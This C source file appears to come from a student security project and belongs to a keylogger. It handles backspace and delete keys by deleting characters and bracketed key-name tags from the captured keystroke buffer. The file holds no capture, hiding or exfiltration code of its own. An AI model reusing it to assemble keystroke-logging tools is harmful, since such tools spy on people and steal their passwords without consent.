/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keylog_del.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 18:32:14 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 19:28:36 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <linux/input.h>

static int	get_dir_value(t_keylog_buf *kl_buf, int dir)
{
	if ((int)kl_buf->index + dir >= 0 && (int)kl_buf->index + dir <= (int)kl_buf->len)
		return (kl_buf->index + dir);
	return (kl_buf->index);
}

static int	to_del(t_keylog_buf *kl_buf, int dir)
{
	int		i;
	int		last_idx;
	char	beg;
	char	end;

	beg = dir == 1 ? '<' : '>';
	end = dir == 1 ? '>' : '<';
	i = get_dir_value(kl_buf, dir);
	while (i >= 0 && i <= (int)kl_buf->len &&
		kl_buf->buf[i] && kl_buf->buf[i] == beg)
	{
		last_idx = i;
		i += dir;
		while (i > 0 && i < (int)kl_buf->len && kl_buf->buf[i]
			&& kl_buf->buf[i] != end && kl_buf->buf[i] != beg)
			i += dir;
		if (kl_buf->buf[i] && kl_buf->buf[i] != end)
		{
			i = last_idx;
			break ;
		}
		else if (i + dir >= 0 && i + dir <= (int)kl_buf->len)
			i += dir;
	}
	return (i);
}

static void	del_string(t_keylog_buf *kl_buf, int dir, int len, int i)
{
	if (dir == 1 && kl_buf->index + len <= kl_buf->len)
	{
		if (i == (int)kl_buf->len)
			ft_strncpy(kl_buf->buf + kl_buf->index, "", 1);
		else
			ft_memmove(kl_buf->buf + kl_buf->index, kl_buf->buf + i,
				kl_buf->len - i + 1);
	}
	else if (dir == -1 && kl_buf->index - len <= kl_buf->len)
	{
		if (kl_buf->index == kl_buf->len)
			ft_strncpy(kl_buf->buf + i, "", 1);
		else
			ft_memmove(kl_buf->buf + i, kl_buf->buf + i + 1,
				kl_buf->len - i);
	}
}

int			keylog_del(t_keylog_buf *kl_buf, t_ull code)
{
	int		i;
	int		dir;
	int		len;

	dir = code == KEY_BACKSPACE ? -1 : 1;
	if ((dir == -1 && kl_buf->index == 0) || (dir == 1 && kl_buf->index == kl_buf->len))
		return (0);
	i = to_del(kl_buf, dir);
	len = (kl_buf->index - i) * (dir * -1);
	if (i >= 0)
		del_string(kl_buf, dir, len, i);
	kl_buf->index = dir == 1 ? kl_buf->index : kl_buf->index - 1;
	kl_buf->len -= 1;
	return (1);
}
